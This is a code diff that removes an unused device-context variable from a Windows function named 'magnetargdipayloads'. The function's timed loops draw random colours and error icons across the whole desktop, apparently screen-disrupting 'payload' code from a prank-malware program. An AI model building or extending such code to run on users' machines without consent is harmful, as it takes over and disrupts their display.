@@ -142,7 +142,6 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 	int icony;
 	HICON error;
 	HWND hwnd;
-	HDC desktop;
 	HDC hdc;
 	RECT rekt;
 	COLORREF clrrainbow;
@@ -156,7 +155,6 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 	while ((clock() - payload1) / CLOCKS_PER_SEC <= 10)
 	{
 		hwnd = GetDesktopWindow();
-		desktop = GetWindowDC(hwnd);
 		hdc = GetDC(NULL);
 		rekt;
 		GetWindowRect(hwnd, &rekt);
@@ -168,7 +166,6 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 	while ((clock() - payload2) / CLOCKS_PER_SEC <= 10)
 	{
 		hwnd = GetDesktopWindow();
-		desktop = GetWindowDC(hwnd);
 		hdc = GetDC(NULL);
 		rekt;
 		GetWindowRect(hwnd, &rekt);
@@ -184,7 +181,6 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 		width = GetSystemMetrics(SM_CXSCREEN);
 		height = GetSystemMetrics(SM_CYSCREEN);
 		hwnd = GetDesktopWindow();
-		desktop = GetWindowDC(hwnd);
 		hdc = GetDC(NULL);
 		int xyrng = rng() % width, h = height - rng() % width - (width / 2 - 110);
 		clrrainbow = RGB(rng() % 255, rng() % 255, rng() % 255);
@@ -248,7 +244,6 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 	while ((clock() - payload4) / CLOCKS_PER_SEC <= 10)
 	{
 		hwnd = GetDesktopWindow();
-		desktop = GetWindowDC(hwnd);
 		hdc = GetDC(NULL);
 		rekt;
 		GetWindowRect(hwnd, &rekt);
@@ -284,7 +279,6 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 		icony = GetSystemMetrics(SM_CYICON);
 		error = LoadIconW(NULL, IDI_HAND);
 		hwnd = GetDesktopWindow();
-		desktop = GetWindowDC(hwnd);
 		hdc = GetDC(NULL);
 		rekt;
 		GetWindowRect(hwnd, &rekt);
@@ -324,7 +318,6 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 	while ((clock() - payload6) / CLOCKS_PER_SEC <= 20)
 	{
 		hwnd = GetDesktopWindow();
-		desktop = GetWindowDC(hwnd);
 		hdc = GetDC(NULL);
 		rekt;
 		GetWindowRect(hwnd, &rekt);
@@ -341,7 +334,6 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 	while ((clock() - payload7) / CLOCKS_PER_SEC <= 20)
 	{
 		hwnd = GetDesktopWindow();
-		desktop = GetWindowDC(hwnd);
 		hdc = GetDC(NULL);
 		rekt;
 		GetWindowRect(hwnd, &rekt);
@@ -380,7 +372,6 @@ DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 		width = GetSystemMetrics(SM_CXSCREEN);
 		height = GetSystemMetrics(SM_CYSCREEN);
 		hwnd = GetDesktopWindow();
-		desktop = GetWindowDC(hwnd);
 		hdc = GetDC(NULL);
 		rekt;
 		GetWindowRect(hwnd, &rekt);
